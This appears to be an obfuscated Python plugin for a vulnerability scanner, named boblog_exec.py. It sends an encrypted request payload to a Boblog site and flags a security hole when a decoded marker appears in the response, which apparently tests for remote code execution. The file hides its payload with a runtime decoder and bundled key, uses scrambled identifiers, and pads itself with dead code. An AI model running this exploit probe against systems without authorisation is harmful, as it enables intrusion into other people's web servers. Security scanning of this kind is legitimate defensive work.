# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'a13b6776facce2ce24b9407fe76b7d9a2ac9f97fd11b4c03da49c5dc1bfdd4ed'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: boblog_exec.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''boblog''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, oo, i1iII1IiiIiI1, oo, oo = curl.curl(o0OO00 + decode('\x9cG\x1aO\x98\xad\x80\xf1@\x8e}\x03\x9aR\x1f\xfbH\xf4\x95\x02\xa4y1z\xae0\xb7\xe1=\xc5\xa0\x9c\xd5N\x13\x0f\x88\xa2\xad\xbcA\xdb.(\xd0_S\xd6\x1e\xe3\xdfJ\xe4/f!\xb8(\xa7\xe81\xdf\xe1\xd8\x95\x153B\xd4\x80\xd6\xe4\x02\x8cuK\xcdI\x1f\xf0O\xb0\x8b^\xa4kz"\xb2-\xab\xa8!\xcf\x8b\x9d\xd5W\x1a\x06\x8e\xed\xb7\xa5c\xc70U\xbd\x0e\x11\xb0s\xa8\x91\x03\xf4>i7\xf4\x01\xf1\xf69\xc8\xe1\xd9\x8foSX\xb6\xf8\xc8\xe8\x11\x8ctU\xc5_W\xc2H\xa8\x9bK\xfb9y6\xeeg\x91'))
    if i1iII1IiiIiI1 and i1iII1IiiIiI1.find(decode('\xd5KA\x02\xd9\xe2\x9a\xedT\x9a0X\xc5\x0f\x19\xbd\x18\xe7\x8dM\xb5k<)\xb6=\xff\xb8)\x91\xbc\x95')) != -1:
        security_hole(o0OO00)
        if 0:
            ooOoO0O00 * IIiIiII11i


if __name__ == '__main__':
    from dummy import *

#KEY---a13b6776facce2ce24b9407fe76b7d9a2ac9f97fd11b4c03da49c5dc1bfdd4ed---